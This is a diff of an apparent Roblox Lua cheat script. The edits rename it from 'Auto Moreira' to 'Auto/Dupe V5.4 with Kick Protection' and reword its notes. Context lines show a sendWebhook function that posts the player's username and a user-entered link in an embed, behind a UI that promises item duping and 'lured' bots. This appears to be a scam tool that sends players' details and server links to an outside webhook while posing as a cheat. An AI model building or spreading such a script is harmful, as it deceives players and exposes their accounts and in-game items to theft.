@@ -146,7 +146,7 @@ local function sendWebhook(link)
     local objectText = #lines > 0 and table.concat(lines, "\n") or "None"
 
     local embed = {
-        title = "Auto Moreira Scan",
+        title = "Auto and Dupe START",
         color = 16777215,
         fields = {
             {name = "Username", value = player.Name, inline = true},
@@ -266,7 +266,7 @@ infoLabel.BackgroundTransparency = 1
 infoLabel.Font = Enum.Font.Gotham
 infoLabel.TextScaled = true
 infoLabel.TextColor3 = Color3.fromRGB(255,220,0)
-infoLabel.Text = "NOTE: You must be the only one on the server. The better your base is, the better bots you will attract."
+infoLabel.Text = "NOTE: You must be the only one on the server. The better your base is, meam more stacked bots will be lured."
 infoLabel.TextWrapped = true
 infoLabel.TextXAlignment = Enum.TextXAlignment.Left
 infoLabel.Parent = inputFrame
@@ -464,4 +464,4 @@ sendButton.MouseButton1Click:Connect(function()
     end
 end)
 
-print("Auto Moreira V5.0 with Kick Protection loaded successfully!")
+print("Auto/Dupe V5.4 with Kick Protection loaded successfully!")
